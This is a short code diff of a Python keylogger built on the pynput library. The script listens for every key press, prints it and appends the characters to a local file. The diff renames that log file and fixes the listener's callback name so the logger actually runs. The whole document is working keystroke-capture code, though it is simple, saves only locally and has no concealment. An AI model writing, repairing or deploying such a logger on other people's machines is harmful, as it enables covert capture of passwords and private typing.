@@ -3,7 +3,7 @@ from pynput import keyboard
 
 def keyboardPress(key):
     print(str(key))
-    with open("keyfile.txt", 'a') as logkey:  
+    with open("keyPresses.txt", 'a') as logkey:  
         try:
             char = key.char
             logkey.write(char)  
@@ -11,6 +11,6 @@ def keyboardPress(key):
             print("Error getting char")
 
 if __name__ == "__main__":
-    listener = keyboard.Listener(on_press=keypressed)
+    listener = keyboard.Listener(on_press=keyboardPress)
     listener.start()
     input()
